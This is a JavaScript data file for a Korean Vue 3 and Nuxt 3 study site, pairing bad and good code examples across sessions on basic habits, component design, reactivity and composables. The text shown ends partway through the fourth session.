/*
 * finecode-vue-data.js — Vue 3 & Nuxt 3 파인코드 스터디 내용
 *
 * 화면에 보이는 항목은 전부 이 파일에 있다. 새 회차는 sessions 배열 끝에 추가한다.
 * 화면과 체크 저장은 자바와 같은 finecode-check.js 가 맡는다 (vue.html, vue-later.html).
 *
 * 항목 하나의 모양
 *   id     회차 안에서 겹치지 않는 값 (l1, l2, ...). 체크 저장에 쓰이므로 한번 정하면 바꾸지 않는다.
 *   short  목차 칩에 쓰는 짧은 이름
 *   title  제목            (HTML 조각 가능)
 *   ver    제목 옆 작은 표시. 없어도 된다. (예: Vue 3.5, Nuxt 3.x)
 *   why    한두 문장 설명   (HTML 조각 가능: <code>, <strong>)
 *   bad    나쁜 예 코드     (순수 코드. 색칠과 < > 처리는 finecode-check.js 가 한다)
 *   good   좋은 예 코드
 *   single { label, code }  좌우 비교 없이 한 칸으로 보여 줄 때 bad/good 대신 쓴다.
 *   note   보충 설명. 없어도 된다. (HTML 조각 가능)
 *   lang   기본은 'vue' (JS/TS/SFC). 명령어나 설정이면 'plain'. 한 칸만 그렇다면 { good: 'plain' } 처럼 쓴다.
 *   badLabel, goodLabel  칸 제목을 바꿀 때 쓴다. 없으면 나쁨 / 좋음.
 *
 * 코드는 String.raw`...` 안에 그대로 쓴다. 역슬래시(\n 등)도 그대로 쓰면 된다.
 * 단, 코드 안의 백틱은 \` 로, 달러-중괄호는 \${ 로 쓴다 (화면에서는 역슬래시가 빠진다).
 */
window.FINECODE = {
  key: 'vue',
  subject: `Vue 3 & Nuxt 3`,
  lang: 'vue',
  sessions: [
    {
      id: 'vue-1', no: 1, name: `기본 습관`,
      lead: `Vue 3를 Composition API로 쓸 때 매일 손에 붙여야 할 습관입니다. 왼쪽은 흔히 쓰는 나쁜 예, 오른쪽은 고쳐 쓴 좋은 예입니다.`,
      lessons: [
        {
          id: 'l1', short: `script setup`,
          title: `컴포넌트는 &lt;script setup&gt;`, ver: `Vue 3.2+`,
          why: `setup() 함수에서 일일이 return 하지 않아도 최상위 바인딩이 템플릿에 바로 보입니다. 코드가 짧고, 타입 추론과 컴파일 최적화도 이쪽이 좋습니다.`,
          bad: String.raw`
<script>
import { ref } from 'vue'
export default {
  setup() {
    const count = ref(0)
    function inc() { count.value++ }
    return { count, inc }   // 템플릿에 쓸 것을 일일이 돌려준다
  }
}
</script>
`,
          good: String.raw`
<script setup>
import { ref } from 'vue'
const count = ref(0)
function inc() { count.value++ }
// 최상위 바인딩은 템플릿에서 바로 쓴다
</script>

<template>
  <button @click="inc">{{ count }}</button>
</template>
`,
        },
        {
          id: 'l2', short: `ref 기본`,
          title: `상태는 ref 가 기본, reactive 는 묶어 다루는 객체에만`,
          why: `reactive 는 객체 전체를 바꿔 끼우거나 구조 분해하면 반응성이 끊깁니다. 기본값으로 ref 를 쓰고, reactive 는 폼처럼 한 덩어리로 다루는 객체에만 씁니다.`,
          bad: String.raw`
let user = reactive({ name: 'kim', age: 20 })

user = reactive(await fetchUser())   // 재할당: 템플릿은 옛 객체를 본다
const { name } = user                // 구조 분해: 그냥 문자열, 반응 안 함
`,
          good: String.raw`
const user = ref({ name: 'kim', age: 20 })

user.value = await fetchUser()       // 통째로 바꿔도 반응한다
const name = computed(() => user.value.name)

// 폼처럼 필드를 묶어 다루고 교체하지 않을 객체만 reactive
const form = reactive({ name: '', email: '' })
`,
        },
        {
          id: 'l3', short: `.value`,
          title: `스크립트에서는 .value, 템플릿에서는 그냥`,
          why: `템플릿은 최상위 ref 를 자동으로 풀어 주지만 스크립트에서는 .value 로 읽고 씁니다. 빼먹으면 오류 없이 조용히 틀린 값을 씁니다.`,
          bad: String.raw`
const count = ref(0)

if (count > 10) { ... }     // RefImpl 객체와 비교: 항상 false
count = 5                   // const 재할당 오류. let 이어도 반응성이 끊긴다
console.log(count)          // RefImpl { ... }
`,
          good: String.raw`
const count = ref(0)

if (count.value > 10) { ... }
count.value = 5
console.log(count.value)

// 템플릿에서는 .value 없이
// <p>{{ count }}</p>
`,
          note: `TypeScript 를 쓰면 <code>count &gt; 10</code> 은 타입 오류로 잡힙니다. 타입 검사를 켜 두는 이유 중 하나입니다.`,
        },
        {
          id: 'l4', short: `computed`,
          title: `템플릿에서 매번 계산하지 말고 computed`,
          why: `템플릿에서 부른 메서드는 렌더링할 때마다 다시 실행됩니다. computed 는 의존하는 값이 바뀔 때만 다시 계산하고 그 사이에는 캐시를 돌려줍니다.`,
          bad: String.raw`
<template>
  <!-- 렌더링할 때마다 다시 거른다 -->
  <li v-for="item in filterItems()" :key="item.id">{{ item.name }}</li>
</template>

<script setup>
function filterItems() {
  return items.value.filter(i => i.done)
}
</script>
`,
          good: String.raw`
<template>
  <li v-for="item in doneItems" :key="item.id">{{ item.name }}</li>
</template>

<script setup>
// items 가 바뀔 때만 다시 계산한다
const doneItems = computed(() => items.value.filter(i => i.done))
</script>
`,
        },
        {
          id: 'l5', short: `v-for key`,
          title: `v-for 의 key 는 index 가 아니라 고유 id`,
          why: `key 는 Vue 가 어떤 DOM 이 어떤 항목인지 따라가는 기준입니다. index 를 주면 항목을 지우거나 끼워 넣을 때 입력값, 체크 상태, 애니메이션이 한 칸씩 밀립니다.`,
          bad: String.raw`
<li v-for="(todo, index) in todos" :key="index">
  <input type="checkbox" v-model="todo.done">
  {{ todo.text }}
</li>
<!-- 맨 앞 항목을 지우면 체크 상태가 한 칸씩 밀린다 -->
`,
          good: String.raw`
<li v-for="todo in todos" :key="todo.id">
  <input type="checkbox" v-model="todo.done">
  {{ todo.text }}
</li>
<!-- 항목이 옮겨 가도 같은 DOM 을 따라간다 -->
`,
          note: `순서가 바뀌지 않고 추가·삭제도 없는 고정 목록에서만 index 를 써도 괜찮습니다. 그래도 id 가 있으면 id 를 씁니다.`,
        },
        {
          id: 'l6', short: `v-if + v-for`,
          title: `v-if 와 v-for 를 한 요소에 같이 쓰지 않기`,
          why: `Vue 3 에서는 v-if 가 v-for 보다 먼저 평가되어 반복 변수를 v-if 에서 쓸 수 없습니다. 거르는 일은 computed 가 맡고, 목록 전체를 숨길 때는 template 으로 감쌉니다.`,
          bad: String.raw`
<!-- 오류: todo 는 v-if 시점에 아직 없다 -->
<li v-for="todo in todos" v-if="!todo.done" :key="todo.id">
  {{ todo.text }}
</li>
`,
          good: String.raw`
<li v-for="todo in activeTodos" :key="todo.id">
  {{ todo.text }}
</li>

<script setup>
const activeTodos = computed(() => todos.value.filter(t => !t.done))
</script>

<!-- 목록 전체를 숨길 때는 template 으로 감싼다 -->
<template v-if="todos.length">
  <li v-for="todo in todos" :key="todo.id">{{ todo.text }}</li>
</template>
`,
        },
        {
          id: 'l7', short: `props 변경 금지`,
          title: `props 는 읽기만, 바꾸려면 emit`,
          why: `props 는 부모의 상태입니다. 자식이 고치면 데이터 흐름이 양방향이 되어 어디서 바뀌었는지 추적할 수 없습니다. 바꿔 달라고 부모에게 알리거나, 초깃값으로만 쓰고 복사합니다.`,
          bad: String.raw`
const props = defineProps<{ modelValue: string }>()

function clear() {
  props.modelValue = ''    // 경고: 부모 상태를 자식이 몰래 바꾼다
}
`,
          good: String.raw`
const props = defineProps<{ modelValue: string }>()
const emit = defineEmits<{ 'update:modelValue': [value: string] }>()

function clear() {
  emit('update:modelValue', '')   // 바꿔 달라고 부모에게 알린다
}

// 초깃값으로만 쓰고 자식이 따로 들고 갈 값이면 복사한다
const draft = ref(props.modelValue)
`,
        },
        {
          id: 'l8', short: `watch`,
          title: `특정 값에 반응할 때는 watchEffect 보다 watch`,
          why: `watchEffect 는 실행 중 읽은 모든 반응형 값을 추적합니다. await 뒤에 읽은 값은 추적되지 않고, 의도치 않은 값에도 반응합니다. 어떤 값이 바뀔 때 돌아야 하는지 분명하면 watch 로 소스를 적습니다.`,
          bad: String.raw`
watchEffect(async () => {
  const res = await fetch('/api/users/' + userId.value)
  users.value = await res.json()
  if (filter.value) { ... }    // await 뒤에 읽은 값: 추적되지 않는다
})
`,
          good: String.raw`
watch(userId, async (id) => {
  const res = await fetch('/api/users/' + id)
  users.value = await res.json()
}, { immediate: true })

// watchEffect 는 소스가 뻔하고 동기적인 짧은 효과에
watchEffect(() => {
  document.title = title.value
})
`,
        },
        {
          id: 'l9', short: `템플릿 ref`,
          title: `DOM 은 querySelector 대신 템플릿 ref`, ver: `Vue 3.5`,
          why: `querySelector 는 컴포넌트 밖 DOM 까지 뒤지고, 같은 컴포넌트가 둘이면 엉뚱한 것을 잡습니다. 템플릿 ref 는 이 컴포넌트가 그린 요소만 가리킵니다.`,
          bad: String.raw`
onMounted(() => {
  const input = document.querySelector('#name')   // 컴포넌트 밖 DOM 까지 뒤진다
  input.focus()
})
`,
          good: String.raw`
<script setup>
import { useTemplateRef, onMounted } from 'vue'

const input = useTemplateRef('name')     // Vue 3.5
onMounted(() => input.value?.focus())
</script>

<template>
  <input ref="name">
</template>
`,
          note: `3.5 이전에는 <code>const name = ref(null)</code> 처럼 ref 속성과 같은 이름의 변수를 만들면 연결됩니다. 마운트 전에는 값이 null 이니 onMounted 안에서 씁니다.`,
        },
        {
          id: 'l10', short: `이벤트 핸들러`,
          title: `인라인 로직 대신 함수와 수식어`,
          why: `템플릿 안의 긴 식은 읽기도 테스트하기도 어렵습니다. 로직은 함수로 빼고, preventDefault 같은 흔한 DOM 처리는 수식어로 템플릿에서 끝냅니다.`,
          bad: String.raw`
<form @submit="e => { e.preventDefault(); if (!name) return; loading = true; api.save({ name }).then(() => loading = false) }">
`,
          good: String.raw`
<form @submit.prevent="save">

<script setup>
async function save() {
  if (!name.value) return
  loading.value = true
  try { await api.save({ name: name.value }) }
  finally { loading.value = false }
}
</script>
`,
          note: `<code>.prevent</code>, <code>.stop</code>, <code>.self</code>, <code>.once</code>, <code>@keyup.enter</code> 같은 수식어로 흔한 DOM 처리를 템플릿에서 끝냅니다.`,
        },
      ],
    },
    {
      id: 'vue-2', no: 2, name: `컴포넌트 설계`,
      lead: `컴포넌트 경계를 어떻게 자르고 무엇을 주고받을지 정하는 습관입니다. props 는 아래로, 이벤트는 위로가 기본입니다.`,
      lessons: [
        {
          id: 'l1', short: `defineProps 타입`,
          title: `props 는 타입으로 선언하고 기본값은 구조 분해로`, ver: `Vue 3.5`,
          why: `런타임 객체 선언은 배열 안의 타입을 말해 주지 못합니다. 타입 기반 선언은 쓰는 쪽과 안쪽 모두 자동 완성과 검사를 받습니다.`,
          bad: String.raw`
const props = defineProps({
  title: String,
  count: { type: Number, default: 0 },
  items: { type: Array, default: () => [] }   // 안의 타입은 아무도 모른다
})
`,
          good: String.raw`
<script setup lang="ts">
interface Item { id: number; name: string }

const { title, count = 0, items = [] } = defineProps<{
  title: string
  count?: number
  items?: Item[]
}>()
// Vue 3.5: 구조 분해한 변수와 기본값이 반응성을 잃지 않는다
</script>
`,
          note: `3.5 이전에는 <code>withDefaults(defineProps&lt;Props&gt;(), { count: 0 })</code> 를 쓰고, 구조 분해 없이 <code>props.count</code> 로 읽습니다.`,
        },
        {
          id: 'l2', short: `defineEmits 타입`,
          title: `emit 도 이름과 인자를 타입으로`, ver: `Vue 3.3+`,
          why: `문자열 배열로 선언하면 이벤트 이름 오타나 빠진 인자를 아무도 잡지 못합니다. 타입 선언은 컴파일러가 확인합니다.`,
          bad: String.raw`
const emit = defineEmits(['select', 'remove'])

emit('selcet', item)         // 오타가 그대로 나간다
emit('remove')               // 인자가 빠져도 모른다
`,
          good: String.raw`
const emit = defineEmits<{
  select: [item: Item]
  remove: [id: number]
}>()

emit('select', item)         // 이름과 인자를 컴파일러가 확인한다
`,
        },
        {
          id: 'l3', short: `defineModel`,
          title: `v-model 은 defineModel 로`, ver: `Vue 3.4+`,
          why: `modelValue prop 과 update:modelValue 이벤트를 손으로 엮던 상용구가 한 줄이 됩니다. 읽고 쓰면 알아서 부모와 오갑니다.`,
          bad: String.raw`
const props = defineProps<{ modelValue: string }>()
const emit = defineEmits<{ 'update:modelValue': [v: string] }>()

const value = computed({
  get: () => props.modelValue,
  set: v => emit('update:modelValue', v)
})
`,
          good: String.raw`
const value = defineModel<string>({ required: true })
// 읽고 쓰면 알아서 modelValue / update:modelValue 로 오간다

// 이름 있는 모델도 같은 방식: v-model:checked
const checked = defineModel<boolean>('checked', { default: false })

// <input v-model="value">
`,
        },
        {
          id: 'l4', short: `슬롯`,
          title: `내용을 바꾸는 prop 을 늘리지 말고 슬롯`,
          why: `내용을 바꾸고 싶을 때마다 prop 을 늘리면 컴포넌트가 설정 덩어리가 됩니다. 구조는 컴포넌트가 잡고, 내용은 쓰는 쪽이 슬롯으로 채웁니다.`,
          bad: String.raw`
<Card
  title="주문"
  :show-icon="true"
  icon="cart"
  footer-text="확인"
  footer-button-color="blue"
  @footer-click="confirm"
/>
`,
          good: String.raw`
<Card>
  <template #header>
    <CartIcon /> 주문
  </template>

  기본 슬롯에 본문

  <template #footer>
    <BlueButton @click="confirm">확인</BlueButton>
  </template>
</Card>
`,
          note: `자식의 데이터를 쓰는 쪽에 넘겨야 하면 범위 슬롯입니다: <code>&lt;template #item="{ row }"&gt;</code>.`,
        },
        {
          id: 'l5', short: `provide/inject`,
          title: `provide/inject 는 InjectionKey 로 타입을 붙인다`,
          why: `문자열 키는 오타를 못 잡고 inject 결과가 unknown 입니다. Symbol 키에 타입을 붙이면 양쪽이 같은 타입을 공유합니다.`,
          bad: String.raw`
// 부모
provide('theme', theme)

// 깊은 자식
const theme = inject('theme')      // 타입: unknown, 키 오타도 못 잡는다
`,
          good: String.raw`
// keys.ts
import type { InjectionKey, Ref } from 'vue'
export const themeKey: InjectionKey<Ref<'light' | 'dark'>> = Symbol('theme')

// 부모
provide(themeKey, theme)

// 자식
const theme = inject(themeKey)                  // Ref<'light'|'dark'> | undefined
const theme2 = inject(themeKey, ref('light'))   // 기본값을 주면 undefined 가 빠진다
`,
        },
        {
          id: 'l6', short: `전달 방법 고르기`,
          title: `props 드릴링, provide/inject, 스토어 중 고르기`,
          why: `값이 서너 단계를 손으로 내려가면 중간 컴포넌트가 쓰지도 않는 prop 을 들고 다닙니다. 거리와 쓰는 범위에 따라 전달 방법을 고릅니다.`,
          bad: String.raw`
<!-- App → Layout → Sidebar → UserMenu 까지 user 를 손으로 넘긴다 -->
<Layout :user="user" />
  <Sidebar :user="user" />
    <UserMenu :user="user" />
`,
          good: String.raw`
// 한 서브트리 안에서만 쓰는 값: provide / inject
provide(userKey, user)          // App 에서 한 번

// 앱 전체가 쓰고 여러 곳에서 바꾸는 값: Pinia 스토어 (6회차)
const auth = useAuthStore()

// 한두 단계만 내려가는 값: 그냥 props 가 가장 읽기 쉽다
`,
        },
        {
          id: 'l7', short: `이름 짓기`,
          title: `컴포넌트 이름은 두 단어 이상 PascalCase`,
          why: `한 단어 이름은 HTML 요소와 충돌할 수 있어 Vue 가 경고합니다. 접두사로 묶으면 파일 탐색기에서 관련 컴포넌트가 나란히 보입니다.`,
          bad: String.raw`
<!-- components/item.vue, components/list.vue -->
<item v-for="i in list" />
<!-- HTML 요소와 헷갈리고, 한 단어 이름은 규칙 위반 -->
`,
          good: String.raw`
<!-- components/TodoItem.vue, components/TodoList.vue -->
<TodoItem v-for="todo in todos" :key="todo.id" :todo="todo" />

<!-- 기본 컴포넌트는 접두사로: BaseButton, BaseInput -->
<!-- 한 곳에서만 쓰는 자식은 부모 이름을 앞에: TodoListItem -->
`,
        },
        {
          id: 'l8', short: `attrs 상속`,
          title: `루트가 여럿이면 inheritAttrs 를 끄고 자리를 정한다`, ver: `Vue 3.3+`,
          why: `루트 요소가 하나면 class, id, 이벤트 같은 속성이 자동으로 루트에 붙습니다. 루트가 여럿이거나 안쪽 요소에 붙여야 하면 상속을 끄고 $attrs 로 직접 자리를 정합니다.`,
          bad: String.raw`
<!-- BaseInput.vue: 루트가 둘이라 class 가 어디에도 안 붙고 경고만 난다 -->
<template>
  <label>{{ label }}</label>
  <input v-model="value">
</template>
`,
          good: String.raw`
<script setup>
defineOptions({ inheritAttrs: false })
</script>

<template>
  <div class="field">
    <label>{{ label }}</label>
    <input v-model="value" v-bind="$attrs">   <!-- class, placeholder, @blur 가 여기에 -->
  </div>
</template>
`,
        },
        {
          id: 'l9', short: `defineExpose`,
          title: `자식 내부를 열 때는 defineExpose 로 최소만`,
          why: `script setup 컴포넌트는 기본이 닫혀 있습니다. 부모가 자식의 상태를 직접 주무르면 자식을 고칠 때마다 부모가 깨집니다. 꼭 필요한 메서드만 골라 엽니다.`,
          bad: String.raw`
// 부모
const child = ref()
child.value.items.push(x)        // 자식 내부 상태를 직접 주무른다
child.value.internalFlag = true
`,
          good: String.raw`
// 자식: 밖에 열 것만 고른다
defineExpose({ focus, reset })

// 부모
const child = useTemplateRef('child')
child.value?.focus()

// 데이터가 오가야 하면 props / emit 이 먼저
`,
        },
        {
          id: 'l10', short: `제네릭 컴포넌트`,
          title: `목록 컴포넌트는 generic 으로 항목 타입을 받는다`, ver: `Vue 3.3+`,
          why: `어떤 항목이든 받는 컴포넌트를 any 로 쓰면 쓰는 쪽에서 타입이 사라집니다. generic 속성으로 타입 매개변수를 두면 넘긴 배열의 타입이 이벤트까지 이어집니다.`,
          bad: String.raw`
<script setup lang="ts">
defineProps<{
  items: any[]
  selected: any
}>()
defineEmits<{ select: [item: any] }>()
</script>
`,
          good: String.raw`
<script setup lang="ts" generic="T extends { id: number }">
defineProps<{
  items: T[]
  selected?: T
}>()
defineEmits<{ select: [item: T] }>()
</script>

<!-- 쓰는 쪽: items 가 User[] 면 select 의 인자도 User 로 추론된다 -->
`,
        },
      ],
    },
    {
      id: 'vue-3', no: 3, name: `반응성 깊이`,
      lead: `반응성이 어디서 끊기고 어디서 과하게 도는지 아는 것이 Vue 3 디버깅의 절반입니다.`,
      lessons: [
        {
          id: 'l1', short: `toRefs`,
          title: `reactive 를 구조 분해하려면 toRefs`,
          why: `reactive 객체에서 꺼낸 원시값은 그 순간의 값일 뿐입니다. toRefs 로 꺼내면 원본과 이어진 ref 가 됩니다.`,
          bad: String.raw`
const state = reactive({ x: 0, y: 0 })
const { x, y } = state            // 지금 값만 복사된다

function move() { x++ }           // state.x 는 그대로
`,
          good: String.raw`
const state = reactive({ x: 0, y: 0 })
const { x, y } = toRefs(state)    // state 와 이어진 ref 들

function move() { x.value++ }     // state.x 도 바뀐다

// 하나만 필요하면
const x2 = toRef(state, 'x')
`,
        },
        {
          id: 'l2', short: `ref 언랩`,
          title: `ref 는 reactive 속성에서는 풀리고 배열 안에서는 안 풀린다`,
          why: `reactive 객체의 속성에 든 ref 는 .value 없이 읽히지만, 배열이나 Map 안에 든 ref 는 풀리지 않습니다. 템플릿도 최상위 ref 만 풉니다.`,
          bad: String.raw`
const list = reactive([ref(1), ref(2)])
list[0] + 1                       // "[object Object]1"

const obj = { count: ref(0) }     // reactive 가 아닌 일반 객체
// 템플릿: {{ obj.count + 1 }}   → "[object Object]1"
`,
          good: String.raw`
const state = reactive({ count: ref(0) })
state.count + 1                   // 1, 속성 ref 는 자동으로 풀린다

// 배열에는 ref 대신 값을 넣고, 배열 자체를 ref 로
const list = ref([1, 2])
list.value[0] + 1                 // 2
`,
        },
        {
          id: 'l3', short: `shallowRef`,
          title: `큰 데이터는 shallowRef`,
          why: `큰 배열이나 깊은 객체를 ref 에 넣으면 모든 속성을 프록시로 감싸느라 느려집니다. 통째로 교체만 한다면 shallowRef 가 맞습니다.`,
          bad: String.raw`
const rows = ref([])              // 수만 개 행, 각 행의 속성까지 전부 프록시

async function load() {
  rows.value = await fetchRows()  // 느리다
}
`,
          good: String.raw`
const rows = shallowRef([])       // .value 교체만 추적

async function load() {
  rows.value = await fetchRows()  // 빠르다. 템플릿도 갱신된다
}

// 안쪽을 직접 고쳤다면 알려 준다
rows.value[0].done = true
triggerRef(rows)
`,
        },
        {
          id: 'l4', short: `readonly`,
          title: `밖에 내줄 상태는 readonly 로 감싼다`,
          why: `컴포저블이나 스토어가 ref 를 그대로 내주면 누구나 아무 데서나 바꿀 수 있습니다. readonly 로 내주면 바꾸는 길이 제공한 함수뿐이라 추적이 쉽습니다.`,
          bad: String.raw`
// useCart.ts
const items = ref([])
export function useCart() {
  return { items, add }           // 쓰는 쪽이 items.value.push 로 막 넣을 수 있다
}
`,
          good: String.raw`
const items = ref([])
export function useCart() {
  function add(item) { items.value.push(item) }
  return { items: readonly(items), add }   // 바꾸는 길은 add 뿐
}

// 쓰는 쪽
cart.items.value.push(x)          // 개발 모드 경고, 실제로 안 바뀐다
`,
        },
        {
          id: 'l5', short: `watch 소스`,
          title: `watch 소스는 getter 로, deep 은 필요할 때만`, ver: `Vue 3.5`,
          why: `속성 값을 그대로 넘기면 문자열을 넘긴 것이라 감시가 안 됩니다. reactive 를 통째로 넘기면 모든 속성 변화에 돌아 비쌉니다. 한 속성만 보려면 getter 를 넘깁니다.`,
          bad: String.raw`
const user = reactive({ profile: { name: 'kim' } })

watch(user.profile.name, cb)      // 문자열을 넘겼다: 경고, 동작 안 함
watch(user, cb)                   // reactive 는 자동 deep: 모든 속성 변화에 돈다
`,
          good: String.raw`
watch(() => user.profile.name, (name) => { ... })   // 한 속성만

const list = ref([{ done: false }])
watch(list, cb)                                      // ref 는 .value 교체만 본다
watch(list, cb, { deep: true })                      // 안쪽 변화까지
watch(list, cb, { deep: 1 })                         // Vue 3.5: 깊이 제한
`,
        },
        {
          id: 'l6', short: `nextTick`,
          title: `바뀐 DOM 을 읽으려면 nextTick`,
          why: `Vue 는 같은 틱의 상태 변화를 모아 한 번에 렌더링합니다. 상태를 바꾼 직후 DOM 을 읽으면 아직 옛 DOM 입니다.`,
          bad: String.raw`
items.value.push(newItem)
const last = listEl.value.lastElementChild   // 아직 옛 DOM
last.scrollIntoView()                        // 방금 넣은 항목이 아니다
`,
          good: String.raw`
items.value.push(newItem)
await nextTick()                             // DOM 갱신이 끝난 뒤
listEl.value.lastElementChild.scrollIntoView()
`,
          note: `상태만 바꾸고 끝나는 코드에는 nextTick 이 필요 없습니다. DOM 을 읽거나 재야 할 때만 씁니다.`,
        },
        {
          id: 'l7', short: `computed 순수`,
          title: `computed 안에서 부수효과 금지`,
          why: `computed 는 언제 몇 번 실행될지 Vue 가 정합니다. 그 안에서 다른 상태를 바꾸면 무한 루프나 추적 불가능한 버그가 납니다. 양방향이 필요하면 쓰기 가능 computed 로 의도를 드러냅니다.`,
          bad: String.raw`
const fullName = computed(() => {
  log('계산')                        // 부수효과
  user.value.visits++                // 다른 상태 변경: 무한 루프 위험
  return first.value + ' ' + last.value
})

fullName.value = 'a b'               // 읽기 전용, 경고
`,
          good: String.raw`
const fullName = computed(() => first.value + ' ' + last.value)

// 양방향이 필요할 때만 쓰기 가능 computed
const fullName2 = computed({
  get: () => first.value + ' ' + last.value,
  set: (v) => { [first.value, last.value] = v.split(' ') }
})
`,
        },
        {
          id: 'l8', short: `toValue`,
          title: `값, ref, getter 를 모두 받으려면 toValue`, ver: `Vue 3.3+`,
          why: `인자가 ref 인지 값인지 isRef 로 분기하면 getter 는 못 받고 반응도 끊깁니다. MaybeRefOrGetter 타입과 toValue 로 세 가지를 한 번에 받습니다.`,
          bad: String.raw`
function useTitle(title) {
  const t = isRef(title) ? title.value : title
  document.title = t                 // ref 가 바뀌어도 다시 안 돈다
}
`,
          good: String.raw`
import { toValue, watchEffect, type MaybeRefOrGetter } from 'vue'

function useTitle(title: MaybeRefOrGetter<string>) {
  watchEffect(() => {
    document.title = toValue(title)  // 문자열, ref, () => 문자열 모두 받는다
  })
}

useTitle('홈')
useTitle(pageTitle)
useTitle(() => user.value.name + '님')
`,
        },
        {
          id: 'l9', short: `markRaw`,
          title: `외부 라이브러리 인스턴스는 markRaw`,
          why: `지도, 차트, 에디터 인스턴스를 reactive 안에 넣으면 내부 객체까지 프록시로 감싸 동작이 깨지거나 몹시 느려집니다. 반응성이 필요 없는 값은 프록시에서 빼둡니다.`,
          bad: String.raw`
const state = reactive({
  map: new maplibregl.Map({ ... }),   // 인스턴스 안쪽까지 깊은 프록시
  chart: new Chart(ctx, config)       // 내부 동작이 깨지거나 몹시 느려진다
})
`,
          good: String.raw`
const state = reactive({
  map: markRaw(new maplibregl.Map({ ... })),   // 프록시로 감싸지 않는다
})

// 또는 교체만 추적하면 되는 인스턴스는 shallowRef 로
const chart = shallowRef<Chart>()
`,
        },
        {
          id: 'l10', short: `watch 정리`,
          title: `비동기 watch 는 onCleanup 으로 옛 요청을 취소`, ver: `Vue 3.5`,
          why: `값이 빠르게 바뀌면 먼저 보낸 요청이 늦게 도착해 새 결과를 덮어씁니다. 다음 실행 전에 이전 요청을 취소하는 정리 함수를 등록합니다.`,
          bad: String.raw`
watch(query, async (q) => {
  const res = await search(q)
  results.value = res               // 늦게 온 옛 요청이 새 결과를 덮는다
})
`,
          good: String.raw`
watch(query, async (q, _, onCleanup) => {
  const ctrl = new AbortController()
  onCleanup(() => ctrl.abort())      // 다음 실행 전이나 정지 시 취소
  results.value = await search(q, { signal: ctrl.signal })
})

// Vue 3.5: 콜백 인자 없이 어디서든 등록 (동기 구간에서만)
import { onWatcherCleanup } from 'vue'
watch(query, (q) => {
  const ctrl = new AbortController()
  onWatcherCleanup(() => ctrl.abort())
  search(q, { signal: ctrl.signal }).then(r => results.value = r)
})
`,
        },
      ],
    },
    {
      id: 'vue-4', no: 4, name: `컴포저블`,
      lead: `상태와 로직을 use 함수로 묶어 재사용하는 방식입니다. 컴포저블의 규칙 몇 가지만 지키면 컴포넌트가 가벼워집니다.`,
      lessons: [
        {
          id: 'l1', short: `use 함수로`,
          title: `반복되는 상태 + 로직은 useXxx 로 묶는다`,
          why: `마우스 좌표, 창 크기, 온라인 여부처럼 여러 컴포넌트가 같은 로직을 복사하면 고칠 때 전부 찾아다녀야 합니다. use 접두사 함수로 묶으면 한 줄로 가져다 씁니다.`,
          bad: String.raw`
<script setup>
// 컴포넌트마다 같은 코드를 복사한다
const x = ref(0), y = ref(0)
function update(e) { x.value = e.pageX; y.value = e.pageY }
onMounted(() => window.addEventListener('mousemove', update))
onUnmounted(() => window.removeEventListener('mousemove', update))
</script>
`,
          good: String.raw`
// composables/useMouse.ts
export function useMouse() {
  const x = ref(0), y = ref(0)
  function update(e: MouseEvent) { x.value = e.pageX; y.value = e.pageY }
  onMounted(() => window.addEventListener('mousemove', update))
  onUnmounted(() => window.removeEventListener('mousemove', update))
  return { x, y }
}

// 컴포넌트
const { x, y } = useMouse()
`,
        },
        {
          id: 'l2', short: `refs 반환`,
          title: `컴포저블은 reactive 가 아니라 ref 들을 담은 객체를 돌려준다`,
          why: `reactive 를 돌려주면 쓰는 쪽이 구조 분해하는 순간 반응성이 끊깁니다. ref 를 담은 일반 객체는 구조 분해해도 각 ref 가 살아 있습니다.`,
          bad: String.raw`
export function useCounter() {
  const state = reactive({ count: 0, double: computed(() => state.count * 2) })
  return state
}

const { count } = useCounter()    // 구조 분해하는 순간 반응성이 끊긴다
`,
          good: String.raw`
export function useCounter() {
  const count = ref(0)
  const double = computed(() => count.value * 2)
  function inc() { count.value++ }
  return { count, double, inc }   // ref 들을 담은 일반 객체
}

const { count, inc } = useCounter()          // 구조 분해해도 그대로 반응형
const counter = reactive(useCounter())       // 한 덩어리로 쓰고 싶으면 감싼다
`,
        },
        {
          id: 'l3', short: `인자 받기`,
          title: `인자는 MaybeRefOrGetter 로 받아 반응하게`,
          why: `문자열만 받으면 호출 시점의 값으로 굳습니다. 값, ref, getter 를 모두 받고 안에서 toValue 로 읽으면 인자가 바뀔 때 따라 돕니다.`,
          bad: String.raw`
export function useFetch(url: string) {
  const data = ref(null)
  fetch(url).then(r => r.json()).then(d => data.value = d)
  return { data }
}

useFetch('/api/users/' + id.value)   // id 가 바뀌어도 다시 안 부른다
`,
          good: String.raw`
export function useFetch(url: MaybeRefOrGetter<string>) {
  const data = ref(null)
  watchEffect(() => {
    data.value = null
    fetch(toValue(url)).then(r => r.json()).then(d => data.value = d)
  })
  return { data }
}

useFetch(() => '/api/users/' + id.value)   // id 가 바뀌면 다시 부른다
`,
        },
        {
          id: 'l4', short: `호출 위치`,
          title: `컴포저블은 setup 의 동기 구간에서 부른다`,
          why: `onMounted, inject, provide 같은 API 는 현재 컴포넌트 인스턴스가 잡혀 있는 setup 동기 구간에서만 동작합니다. await 뒤나 콜백 안에서 부르면 조용히 무시됩니다.`,
          bad: String.raw`
<script setup>
const user = await fetchUser()
const { x } = useMouse()         // await 뒤: onMounted 가 등록되지 않는다

button.addEventListener('click', () => {
  useTracker()                   // 이벤트 핸들러 안: 인스턴스 없음
})
</script>
`,
          good: String.raw`
<script setup>
const { x } = useMouse()         // 최상위에서 먼저
const tracker = useTracker()

const user = await fetchUser()   // await 는 그 뒤에 (Suspense 필요)

button.addEventListener('click', () => tracker.track('click'))
</script>
`,
        },
        {
          id: 'l5', short: `정리`,
          title: `등록한 것은 onScopeDispose 로 해제한다`,
          why: `이벤트 리스너, 타이머, 구독을 걸어 두고 해제하지 않으면 컴포넌트가 사라진 뒤에도 남아 메모리와 CPU 를 먹습니다. 컴포저블은 자기가 건 것을 자기가 푸는 것까지가 책임입니다.`,
          bad: String.raw`
export function useOnline() {
  const online = ref(navigator.onLine)
  window.addEventListener('online', () => online.value = true)
  window.addEventListener('offline', () => online.value = false)
  return online              // 컴포넌트가 사라져도 리스너는 남는다
}
`,
          good: String.raw`
export function useOnline() {
  const online = ref(navigator.onLine)
  const on = () => online.value = true
  const off = () => online.value = false
  window.addEventListener('online', on)
  window.addEventListener('offline', off)
  onScopeDispose(() => {                 // 컴포넌트든 effectScope 든 끝날 때
    window.removeEventListener('online', on)
    window.removeEventListener('offline', off)
  })
  return online
}
`,
